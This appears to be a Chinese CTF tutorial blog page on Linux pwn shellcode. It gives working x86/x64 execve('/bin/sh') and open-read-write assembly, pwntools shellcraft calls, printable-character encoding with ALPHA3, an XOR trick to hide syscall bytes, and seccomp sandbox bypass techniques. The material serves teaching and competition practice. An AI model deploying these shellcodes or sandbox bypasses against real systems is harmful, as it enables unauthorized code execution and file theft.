@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+    <head>
+        <meta charset="UTF-8">
+        <link rel="apple-touch-icon" sizes="76x76" href="/img/avater.jpg">
+        <link rel="icon" href="/img/avater.jpg">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">
+        
+                <meta name="theme-color" content="#2f4154">
+                <meta name="author" content="whistle.H">
+                <meta name="keywords" content="">
+                
+                    <meta name="description" content="这篇文章主要讲讲Pwn中的shellcode利用，主要基于Linux操作系统。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn中的shellcode利用">
+<meta property="og:url" content="http://example.com/2023/12/07/blog0041-pwn%E4%B8%AD%E7%9A%84shellcode%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="The world of whistleH">
+<meta property="og:description" content="这篇文章主要讲讲Pwn中的shellcode利用，主要基于Linux操作系统。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-12-07T13:06:37.000Z">
+<meta property="article:modified_time" content="2023-12-07T14:01:30.905Z">
+<meta property="article:author" content="whistle.H">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary_large_image">
+                        
+                                
+                                        
+                                                    <title>
+                                                        pwn中的shellcode利用 - The world of whistleH
+                                                    </title>
+
+                                                    <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mac.css">
+
+
+
+                                                        <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+                                                            <script  src="/js/utils.js" ></script>
+                                                                <script  src="/js/color-schema.js" ></script>
+                                                                    
+
+
+                                                                        
+    <meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>The world of whistleH</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn中的shellcode利用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-07 21:06" pubdate>
+          2023年12月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn中的shellcode利用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这篇文章主要讲讲Pwn中的shellcode利用，主要基于Linux操作系统。</p>
+<span id="more"></span>
+<h2 id="shellcode基础">shellcode基础</h2>
+<p>shellcode指的是攻击者向可执行内存注入的代码。</p>
+<p>从这段话可以看出两个点</p>
+<ol type="1">
+<li>shellcode是一种代码</li>
+<li>写入shellcode的空间必须具备执行权限</li>
+</ol>
+<p>当我们将程序的控制流劫持到shellcode处，shellcode便可以执行我们的命令，以下便是最常见的x86 shellcode。</p>
+<p>通过x86的系统调用<code>execve</code>，运行<code>/bin/sh</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push   0x68732f2f<br>push   0x6e69622f<br>mov    ebx,esp<br>xor    ecx,ecx<br>xor    edx,edx<br>push   0xb<br>pop    eax<br>int    0x80<br></code></pre></td></tr></table></figure>
+<p>同理x64的系统调用如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rdx, 0x68732f6e69622f<br>push rdx<br>mov rdi, rsp<br>xor rdx, rdx<br>xor rsi, rsi<br>mov rax, 59<br>syscall<br></code></pre></td></tr></table></figure>
+<p>常见的orw shellcode如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov  rdx, 0x67616c662f<br>push rdx<br>mov rdi, rsp<br>xor rsi, rsi<br>xor rdx, rdx<br>mov rax, 2<br>syscall<br>mov rdi, rax<br>mov rsi, rsp<br>mov dl, 100<br>xor rax, rax<br>syscall<br>mov rdx, rax<br>mov rdi, 1<br>mov al, 1<br>syscall  <br></code></pre></td></tr></table></figure>
+<h2 id="pwntools">pwntools</h2>
+<p>如果留给shellcode的空间足够，我们通常使用pwntools自带的shellcode工具</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-built_in">print</span>(asm(shellcraft.sh()))<br><br><span class="hljs-comment"># open(file=&#x27;flag&#x27;, oflag=0, mode=0)</span><br>shellcraft.amd64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)<br><span class="hljs-comment"># read(fd, buf, count)</span><br>shellcraft.amd64.linux.read(fd=<span class="hljs-number">0</span>, buffer=<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)<br><span class="hljs-comment"># write(fd, buf, count)</span><br>shellcraft.amd64.linux.write(fd=<span class="hljs-number">1</span>, buffer=<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure>
+<h2 id="shellcode-变形">shellcode 变形</h2>
+<h3 id="可打印字符">可打印字符</h3>
+<p>如果shellcode限制必须为可打印字符，我们可以借助一些工具来实现对shellcode的变形</p>
+<p>这里推荐<a target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3.git">Alpha3</a>来完成这一操作</p>
+<p>这里做简单的使用说明</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">// shellcode导出至二进制文件<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(asm(shellcraft.sh())<br></code></pre></td></tr></table></figure>
+<p>然后调用如下命令完成shellcode的变形</p>
+<p>其中参数rax表示存放shellcode地址的寄存器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;shellcode&quot;<br></code></pre></td></tr></table></figure>
+<p>如果有的是限制非常严格，只能自己手写shellcode，可以参照以下资料</p>
+<p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric_shellcode</a></p>
+<p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20110716082815/http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes">x86字符编码表</a></p>
+<p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes">x64字符编码表</a></p>
+<h3 id="长度限制">长度限制</h3>
+<p>如果可以写shellcode的空间不足，我们必须缩减shellcode的长度。</p>
+<p>缩减shellcode的常见思路如下</p>
+<ol type="1">
+<li>巧妙借用前后被赋值的寄存器</li>
+<li>尽量使用位数少的寄存器，如rax不如使用al</li>
+</ol>
+<p>当然，如果如果存在其他可写可执行的空间，可以将shellcode跳转过去，在其他足够的空间构建shellcode</p>
+<h3 id="字符绕过">字符绕过</h3>
+<p>有的时候可能存在需要绕过某些字符的情况，如果是非可见字符，那么可以使用刚刚的可打印字符绕过。</p>
+<p>如果是一些opcode，例如<code>'\x0f\x05'</code>的情况，因为shellcode在内存中是<code>rwx</code>，因此我们完全可以在运行中修改shellcode中的值。</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor word ptr[rip], 0x959f<br>nop<br>nop<br></code></pre></td></tr></table></figure>
+<p>解释一下这段shellcode，当程序运行到xor时，rip指向nop，取2个字节则为0x9090，再与0x959f异或就可以得到0x050f，因为是小端序，写入内存就是<code>'\x0f\x05'</code></p>
+<p>由此，我们就得到绕过syscall的shellcode</p>
+<h2 id="seccomp">seccomp</h2>
+<p>seccomp可以用于限制某些系统调用，可以对shellcode做出有效的限制。</p>
+<p>seccomp是在内核层面禁用系统调用，一般主要是针对rax的值进行检查。</p>
+<h3 id="orw">ORW</h3>
+<p>这个在shellcode基础提到过，通过调用open、read、write三个常见的系统调用，我们可以读取对应系统上的文件。那么获取flag文件也相对比较容易。</p>
+<p>这里需要注意一下，glibc中的open函数实际是调用了<code>openat</code>系统调用，如果题目封禁了open，我们还是存在可以利用的空间。</p>
+<h3 id="x86x64架构差异">x86/x64架构差异</h3>
+<p>由于seccomp的检查是针对rax来做的，64位系统中使用32位系统调用，通过两者系统调用号的差异，从而完成绕过。</p>
+<p>使用32位模式的方案有两种。</p>
+<ul>
+<li><p>retfq函数修改cs寄存器的值</p>
+<p><a target="_blank" rel="noopener" href="https://lingze.xyz/pages/07df2e/#使用32位的系统调用">qwb 2021 shellcode</a>.</p></li>
+<li><p>syscall_number |= X32_SYSCALL_BIT (0x40000000)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ktb88/2018_TDCTF/tree/master/pwnable/sandbox_school_5">TDctf2018 sandbox5</a></p></li>
+</ul>
+<h3 id="no-write">No write</h3>
+<p>如果不允许直接输出的话，可以使用类似盲注的手段，在shellcode中加入cmp，往往可以使用时间盲注或者其他回来来达成效果。</p>
+<p>可以参考这道题：</p>
+<p><a target="_blank" rel="noopener" href="https://lingze.xyz/pages/07df2e/#测信道时间爆破flag">qwb 2021 shellcode</a>.</p>
+<h3 id="procselfmem注入">/proc/self/mem注入</h3>
+<p>这里是另一个思路, 利用父子进程和<code>/proc/self/mem</code>的操作,</p>
+<p>调用fork形成父子进程以后, 父进程再进行seccomp设置, 因此子进程不再沙盒内, 我们使用有限的系统调用向子进程内注入代码, 并利用子进程getshell,</p>
+<p>具体题目是： <a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/tree/master/2020/quals/sandbox-writeonly">googlectf 2020: onlywrtie</a>.</p>
+<h2 id="nop-sled">nop-sled</h2>
+<p>sled的意思是滑动，即你的rip一旦指向这nop指令区域，那么rip最后迟早会执行到你的shellcode。</p>
+<p>这里我们举一个简单的例子：</p>
+<p>由于栈地址的随机化，有时候我们要枚举函数的返回地址。假设此刻你已经利用其他条件推测是返回地址是(0x401000,0x401010]，你只有一次猜的机会，那么你成功的概率是<span class="math inline">\(\frac{1}{16}\)</span></p>
+<p>但是如果你在(0x401000,0x401010]填充了nop指令，并在其后接上你的real shellcode，那么函数返回的时候就会进入你的nop滑动条，最终执行到你的shellcode。</p>
+<p>具体题目： <a target="_blank" rel="noopener" href="https://lingze.xyz/pages/fecaf5/">rwctf2022 QLaaS</a>.</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" class="category-chain-item">二进制安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/shellcode/" class="category-chain-item">shellcode</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" class="print-no-link">#二进制</a>
+      
+        <a href="/tags/shellcode/" class="print-no-link">#shellcode</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn中的shellcode利用</div>
+      <div>http://example.com/2023/12/07/blog0041-pwn中的shellcode利用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>whistle.H</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/25/blog0042-%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86%E5%9B%BE%E7%A4%BA/" title="栈迁移原理图示">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">栈迁移原理图示</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/22/blog0040-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E5%9B%9B%EF%BC%89-JavaEE%E6%A1%86%E6%9E%B6/" title="Java代码审计（四） JavaEE框架">
+                        <span class="hidden-mobile">Java代码审计（四） JavaEE框架</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
